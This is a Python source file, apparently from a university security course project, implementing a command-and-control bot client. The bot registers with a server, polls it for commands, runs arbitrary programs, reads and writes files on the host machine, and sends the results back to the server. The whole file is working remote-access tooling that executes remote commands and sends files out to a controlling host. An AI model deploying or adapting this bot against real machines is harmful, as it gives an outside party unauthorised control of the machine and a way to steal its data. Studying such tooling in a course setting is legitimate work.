# ===---------------------------------------------------------------------=== #
#
# CPSC4240 Project, Fall 24
# Adam Clements, Evan Cox, Isaac Fletcher, Tim Koehler
#
# ===---------------------------------------------------------------------=== #

from aiohttp import ClientSession
from time import sleep
from collections import deque
from typing import Any
import argparse
import asyncio
import base64

ID = str()
SERVER_URL = str()
POLL_SEC = int()

async def run_and_return_output(command: dict[str, Any]) -> bytes:
    # run the subprocess without blocking the executor, we may be in either a reverse shell context
    # or inside an `async with` which may be trying to do keepalives or whatever in the background
    exe, args = command["path"], command["payload"]
    proc = await asyncio.create_subprocess_exec(exe, *args, stdout=asyncio.subprocess.PIPE)
    stdout, _ = await proc.communicate()

    return stdout

def read_file_sync(path: str) -> bytes:
    # note: reading in binary mode to get `bytes` object from f.read()
    with open(path,  "rb") as f:
        return f.read()

async def read_file(command: dict[str, Any]) -> bytes:
    loop = asyncio.get_event_loop()

    # same reason as above, we avoid blocking the executor while reading the file
    return await loop.run_in_executor(None, lambda: read_file_sync(command["path"]))

def write_file_sync(path: str, data: bytes) -> bytes:
    # note: writing in binary mode to avoid schenanigans with newlines
    with open(path,  "wb") as f:
        # turn the integer into a string, and encode it as bytes
        return str(f.write(data)).encode()

async def write_file(command: dict[str, Any]) -> bytes:
    loop = asyncio.get_event_loop()
    data = base64.standard_b64decode(command["payload"][0])

    # same reason as above, we avoid blocking the executor while reading the file
    return await loop.run_in_executor(None, lambda: write_file_sync(command["path"], data))

async def return_result(session: ClientSession, result: bytes):
    # to avoid weird behavior with files containing escape characters/arbitrary bytes,
    # we instead send a base64-encoded array of bytes containing our 'result', this is
    # then decoded on the server side and output to files for viewing as needed
    b64 = base64.standard_b64encode(result).decode()

    await session.post(f"{SERVER_URL}/result", json={"id": ID, "result": b64})

async def execute_command(session: ClientSession, command: dict[str, Any]) -> None:
    try:
        if command["action"] == "execute":
            result = await run_and_return_output(command)
        elif command["action"] == "read":
            result = await read_file(command)
        elif command["action"] == "write":
            result = await write_file(command)
        # exiting requires special handling, return early
        elif command["action"] == "exit":
            await exit_bot()
            await return_result(session, f"Bot Exited".encode())
            return
        else:
            result = f"unknown action: {command['action']}".encode()

    except Exception as e:
        result = f"exception in parsing command: {e}".encode()

    await return_result(session, result)

async def exit_bot():
    # call the unregister endpoint to remove from the server queue
    # the endpoint returns any remaining queued commands (can store on disk for next run)
    async with ClientSession() as session:
        async with session.get(f"{SERVER_URL}/unregister/{ID}") as response:
            remaining = await response.json()

async def obtain_id() -> str:
    async with ClientSession() as session:
        async with session.get(f"{SERVER_URL}/init") as response:
            return (await response.json())["id"]

async def main():
    global ID, SERVER_URL, POLL_SEC
    
    parser = argparse.ArgumentParser(
        prog="c2-bot",
        description="Bot for C2 system")

    parser.add_argument(
        "--server", help="The address or hostname to register with for commands (ex: http://localhost:8080)", type=str, default="http://localhost:8080"
    )
    
    parser.add_argument(
        "--poll", help="The rate in seconds at which to poll the server for new commands (ex: 5)", type=int, default="5"
    )

    args = parser.parse_args()

    SERVER_URL = args.server
    POLL_SEC = args.poll

    ID = await obtain_id()
    commands = deque()

    while True:
        async with ClientSession() as session:
            url = f"{SERVER_URL}/check/{ID}"

            async with session.get(url) as response:
                returned_cmds = await response.json()

                for cmd in returned_cmds:
                    commands.append(cmd)

            while len(commands) > 0:
                next = commands.popleft()

                await execute_command(session, next)

                if next["action"] == "exit":
                    return

        await asyncio.sleep(POLL_SEC)

if __name__ == "__main__":
    asyncio.run(main())
